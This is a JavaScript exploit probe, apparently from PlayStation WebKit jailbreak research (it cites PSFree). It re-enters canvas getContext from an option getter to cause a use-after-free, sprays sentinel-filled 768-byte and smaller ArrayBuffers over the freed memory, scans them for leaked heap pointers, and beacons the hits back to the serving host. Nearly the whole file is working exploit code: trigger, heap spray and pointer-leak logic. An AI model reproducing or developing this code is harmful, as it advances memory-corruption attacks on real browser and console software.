// PROBE P571v14: Canvas UAF + BigUint64Array raw pointer scan
//
// v13 RESULT: NO-HITS with Uint8Array sentinel check across 7 sizes.
// v14 CHANGES:
//   1. BigUint64Array for raw 64-bit pointer detection (DAZ bypass confirmed by p573)
//   2. Spray ONLY 768-byte ArrayBuffers (exact Canvas2DRenderingContext size)
//   3. 500 spray buffers (5x more than v13's 100 per size)
//   4. Also spray 384B and 192B (sub-allocation sizes from setLineDash, transform)
//   5. Check for ANY non-sentinel qword, not just first 16 bytes
//   6. Trigger UAF multiple times to increase free pool
//
// If IsoHeap is truly disabled on PlayStation (PSFree claim), this should work.

(function() {
  var B = location.protocol + '//' + location.host + '/beacon.php?tag=';
  function send(msg) {
    try { navigator.sendBeacon(B + encodeURIComponent(msg)); } catch(e) {
      try { new Image().src = B + encodeURIComponent(msg); } catch(e2) {}
    }
  }
  function hx64(bv) {
    // BigInt to hex string
    var s = bv.toString(16);
    while (s.length < 16) s = '0' + s;
    return s;
  }

  send('P571v14-BOOT');

  // === PHASE A: Trigger multiple UAFs to flood the free list ===
  var canvases = [];
  var UAF_COUNT = 8;

  for (var u = 0; u < UAF_COUNT; u++) {
    var c = document.createElement('canvas');
    c.width = 4; c.height = 4;

    var inner = null;
    var opts = {};
    Object.defineProperty(opts, 'alpha', {
      get: function() {
        inner = c.getContext('2d');
        // Allocate internal state to dirty more sub-allocations
        inner.setLineDash([1.5, 2.5, 3.5, 4.5, 5.5, 6.5, 7.5, 8.5,
                           9.5, 10.5, 11.5, 12.5, 13.5, 14.5, 15.5, 16.5]);
        inner.setTransform(1.1, 2.2, 3.3, 4.4, 5.5, 6.6);
        inner.save(); inner.save(); inner.save();
        inner.font = '12px serif';
        inner.fillStyle = 'rgba(1,2,3,0.5)';
        inner.strokeStyle = 'rgba(4,5,6,0.7)';
        return true;
      }
    });

    try {
      var outer = c.getContext('bitmaprenderer', opts);
      if (outer) {
        canvases.push({c: c, inner: inner, outer: outer});
      }
    } catch(e) {}
  }

  send('P571v14-UAF|count=' + canvases.length);

  if (canvases.length === 0) {
    send('P571v14-NO-UAF');
    return;
  }

  // === PHASE B: Spray 768-byte ArrayBuffers with BigUint64Array sentinel ===
  var SENTINEL = typeof BigInt !== 'undefined' ? BigInt('0xDEADBEEFCAFEBABE') : null;
  if (!SENTINEL) {
    send('P571v14-NO-BIGINT');
    return;
  }

  var sprays = {};
  var sizes = [768, 384, 192, 96, 48];
  var counts = [500, 200, 200, 100, 100];

  for (var si = 0; si < sizes.length; si++) {
    var sz = sizes[si];
    var cnt = counts[si];
    sprays[sz] = [];
    for (var i = 0; i < cnt; i++) {
      var ab = new ArrayBuffer(sz);
      var bv = new BigUint64Array(ab);
      // Fill with sentinel
      for (var j = 0; j < bv.length; j++) {
        bv[j] = SENTINEL;
      }
      sprays[sz].push({ab: ab, bv: bv});
    }
  }

  send('P571v14-SPRAY|768x500,384x200,192x200,96x100,48x100');

  // === PHASE C: Scan ALL qwords in every buffer for non-sentinel values ===
  var totalHits = 0;
  var results = [];

  for (var si = 0; si < sizes.length; si++) {
    var sz = sizes[si];
    var hits = 0;
    var firstHitData = null;
    var ptrFound = [];

    for (var i = 0; i < sprays[sz].length; i++) {
      var bv = sprays[sz][i].bv;
      var modified = false;

      for (var j = 0; j < bv.length; j++) {
        if (bv[j] !== SENTINEL) {
          modified = true;
          var val = bv[j];

          if (!firstHitData) {
            // Dump first 8 qwords of this hit buffer
            var dump = [];
            for (var k = 0; k < Math.min(8, bv.length); k++) {
              dump.push(hx64(bv[k]));
            }
            firstHitData = dump.join(',');
          }

          // Check for heap pointer pattern (non-zero, not sentinel, not -1)
          if (val !== BigInt(0) && val !== SENTINEL &&
              val !== BigInt('0xFFFFFFFFFFFFFFFF')) {
            var hi = Number(val >> BigInt(32));
            // WebKit heap pointers on PS5: look for 0x000001xxxxxxxxxx range
            // or any consistent non-trivial value
            if (hi > 0 && hi < 0x7FFFFFFF) {
              ptrFound.push(hx64(val));
            }
          }
          break; // Found a hit in this buffer, move to next
        }
      }

      if (modified) hits++;
    }

    if (hits > 0) {
      totalHits += hits;
      results.push('SZ' + sz + ':' + hits + 'h');
      if (firstHitData) {
        send('P571v14-HIT|sz=' + sz + ',i=' + hits + ',d=' + firstHitData);
      }
      if (ptrFound.length > 0) {
        for (var pi = 0; pi < Math.min(ptrFound.length, 5); pi++) {
          send('P571v14-PTR|sz=' + sz + ',p=' + ptrFound[pi]);
        }
      }
    }
  }

  if (totalHits === 0) {
    results.push('NO-HITS');
    send('P571v14-NOHIT|allSentinel');
  }

  send('P571v14-SCAN|' + results.join(','));

  // === PHASE D: Second chance — force GC and re-scan ===
  // Create and discard objects to trigger GC
  for (var g = 0; g < 10000; g++) {
    var tmp = {a: new ArrayBuffer(64), b: [1,2,3]};
  }

  // Trigger another UAF round
  for (var u = 0; u < 4; u++) {
    var c2 = document.createElement('canvas');
    c2.width = 4; c2.height = 4;
    var inner2 = null;
    var opts2 = {};
    Object.defineProperty(opts2, 'alpha', {
      get: function() {
        inner2 = c2.getContext('2d');
        inner2.setLineDash([1,2,3,4,5,6,7,8]);
        return true;
      }
    });
    try { c2.getContext('bitmaprenderer', opts2); } catch(e) {}
  }

  // Spray more 768B buffers
  var spray2 = [];
  for (var i = 0; i < 300; i++) {
    var ab2 = new ArrayBuffer(768);
    var bv2 = new BigUint64Array(ab2);
    for (var j = 0; j < bv2.length; j++) bv2[j] = BigInt('0xCAFEBABEDEADBEEF');
    spray2.push({ab: ab2, bv: bv2});
  }

  // Scan round 2
  var hits2 = 0;
  var SENTINEL2 = BigInt('0xCAFEBABEDEADBEEF');
  for (var i = 0; i < spray2.length; i++) {
    var bv2 = spray2[i].bv;
    for (var j = 0; j < bv2.length; j++) {
      if (bv2[j] !== SENTINEL2) {
        hits2++;
        if (hits2 <= 3) {
          var dump2 = [];
          for (var k = 0; k < Math.min(8, bv2.length); k++) {
            dump2.push(hx64(bv2[k]));
          }
          send('P571v14-R2HIT|i=' + i + ',d=' + dump2.join(','));
        }
        break;
      }
    }
  }

  send('P571v14-R2|hits=' + hits2);
  send('P571v14-DONE');
})();
